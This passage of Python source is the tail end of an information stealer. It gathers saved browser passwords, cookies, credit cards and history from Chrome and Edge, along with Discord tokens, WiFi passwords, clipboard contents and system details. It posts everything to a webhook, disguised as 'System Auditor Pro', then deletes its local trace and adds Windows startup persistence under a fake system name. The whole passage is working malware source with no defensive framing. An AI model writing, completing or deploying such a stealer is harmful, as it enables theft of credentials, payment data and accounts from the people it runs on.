        self.log(f"Extracted {len(wifi_data)} WiFi networks")
        return wifi_data
    
    def get_ip_info(self):
        try:
            response = requests.get('https://ipinfo.io/json', timeout=10)
            if response.status_code == 200:
                return response.json()
            return {}
        except:
            return {}

    def create_data_file(self, data):
        try:
            file_path = os.path.join(os.getcwd(), "system_data.json")
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            
            file_size = os.path.getsize(file_path)
            self.log(f"Data file created: {file_path}")
            self.log(f"File size: {file_size} bytes ({file_size / 1024:.2f} KB)")
            
            return file_path, file_size
        except Exception as e:
            self.log(f"Error creating data file: {e}")
            return None, 0

    def delete_data_file(self, file_path):
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                self.log(f"Data file deleted: {file_path}")
                return True
            return False
        except Exception as e:
            self.log(f"Error deleting data file: {e}")
            return False

    def send_file_to_webhook(self, file_path):
        try:
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f, "application/json")}
                response = requests.post(self.webhook_url, files=files)

            if response.status_code in (200, 204):
                self.log("File successfully sent to webhook!")
                return True
            else:
                self.log(f"Failed to send file. Status code: {response.status_code}")
                return False
        except Exception as e:
            self.log(f"Error sending file: {e}")
            return False

    def grab_all_data(self):
        chrome = Chrome(silent_mode=self.silent)
        edge = Edge(silent_mode=self.silent)
        system_info = SystemInfo(silent_mode=self.silent)
        clipboard_grabber = ClipboardGrabber(silent_mode=self.silent)
        
        chrome_data = chrome.main()
        edge_data = edge.main()
        system_data = system_info.get_system_info()
        
        discord_tokens = self.find_discord_tokens()
        discord_data = discord_tokens[0] if discord_tokens else {}
        
        wifi_data = self.get_wifi_passwords()
        ip_info = self.get_ip_info()
        clipboard = clipboard_grabber.get_clipboard_content()
        
        final_data = {
            'username': self.username,
            'password': self.password,
            'system': system_data,
            'wifi': wifi_data,
            'ip': ip_info,
            'clipboard': clipboard,
            'pulled': {
                'discord': discord_data,
                'chrome': chrome_data,
                'edge': edge_data
            },
            'timestamp': datetime.now(timezone.utc).isoformat()
        }
        
        file_path, file_size = self.create_data_file(final_data)
        
        webhook_success = self.send_to_webhook(final_data, file_size)
        
        if file_path:
            file_success = self.send_file_to_webhook(file_path)
        
        if delete_file and file_path:
            self.delete_data_file(file_path)
        
        return webhook_success

    def send_to_webhook(self, data, file_size):
        try:
            embed = {
                "title": "ADVANCED SYSTEM DATA EXFILTRATION COMPLETE",
                "color": 0xff0000,
                "fields": [
                    {
                        "name": "SYSTEM INFORMATION",
                        "value": f"**Hostname:** {data['system']['computer_name']}\n**User:** {data['system']['username']}\n**OS:** {data['system']['os']} {data['system']['os_version']}\n**IP:** {data['ip'].get('ip', 'Unknown')}\n**MAC:** {data['system']['mac_address']}\n**CPU Cores:** {data['system']['hardware']['cpu']['cores']}\n**RAM:** {data['system']['hardware']['memory']['percent']}% used\n**Antivirus:** {', '.join(data['system']['antivirus']) if data['system']['antivirus'] else 'None detected'}",
                        "inline": False
                    },
                    {
                        "name": "CHROME DATA",
                        "value": f"**Passwords:** {len(data['pulled']['chrome']['passwords'])}\n**Cookies:** {len(data['pulled']['chrome']['cookies'])}\n**History:** {len(data['pulled']['chrome']['history'])}\n**Credit Cards:** {len(data['pulled']['chrome']['credit_cards'])}",
                        "inline": True
                    },
                    {
                        "name": "EDGE DATA",
                        "value": f"**Passwords:** {len(data['pulled']['edge']['passwords'])}\n**Cookies:** {len(data['pulled']['edge']['cookies'])}\n**History:** {len(data['pulled']['edge']['history'])}\n**Credit Cards:** {len(data['pulled']['edge']['credit_cards'])}\n**Downloads:** {len(data['pulled']['edge']['downloads'])}",
                        "inline": True
                    },
                    {
                        "name": "NETWORK DATA",
                        "value": f"**WiFi Networks:** {len(data['wifi'])}\n**Location:** {data['ip'].get('city', 'Unknown')}, {data['ip'].get('country', 'Unknown')}\n**Data File:** {file_size} bytes\n**Clipboard:** {'Captured' if data['clipboard'] else 'Empty'}",
                        "inline": True
                    }
                ],
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "footer": {
                    "text": "Stealth Data Collection Module v4.0"
                }
            }
            
            if data['pulled']['discord']:
                embed["fields"].append({
                    "name": "DISCORD COMPROMISE",
                    "value": f"**Account:** {data['pulled']['discord']['user']['username']}#{data['pulled']['discord']['user'].get('discriminator', '0000')}\n**Email:** {data['pulled']['discord']['user']['email']}\n**Nitro Status:** {'ACTIVE' if data['pulled']['discord']['has_nitro'] else 'INACTIVE'}\n**Servers:** {data['pulled']['discord']['guilds_count']}",
                    "inline": False
                })
            
            payload = {
                "embeds": [embed],
                "username": "System Auditor Pro",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/6001/6001368.png"
            }
            
            response = requests.post(
                self.webhook_url,
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=30
            )
            self.log(f"Webhook response: {response.status_code}")
            return response.status_code in [200, 204]
        except Exception as e:
            self.log(f"Webhook error: {e}")
            return False

def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            stealth_name = StealthManager().hidden_name
            temp_path = os.path.join(tempfile.gettempdir(), stealth_name)
            winreg.SetValueEx(reg_key, "WindowsSystemHelper", 0, winreg.REG_SZ, f'python "{temp_path}"')
        if not silent:
            print("Added to startup")
    except Exception as e:
        if not silent:
            print(f"Startup error: {e}")

class Grabbbbbber:
    def __init__(self, silent_mode=False):
        self.silent = silent_mode

    def log(self, message):
        if not self.silent:
            print(message)

    def main(self):
        stealth = StealthManager()
        stealth_path = stealth.hide_in_system()
        
        WEBHOOK_URL = ""
        self.grabber = Grabber(webhook_url=WEBHOOK_URL, username=os.getenv('USERNAME') or os.getenv('USER') or 'unknown', password="N/A", silent_mode=self.silent)
        success = self.grabber.grab_all_data()
        if success:
            self.log("Advanced data exfiltration successful!")
        else:
            self.log("Data exfiltration failed!")
            
class Main:
    def __init__(self):
        self.grabs = Grabbbbbber(silent_mode=silent)

    def run(self):
        if run_on_startup:
            add_to_startup()
        self.grabs.main()
        
if __name__ == "__main__":
    main = Main()
    main.run()
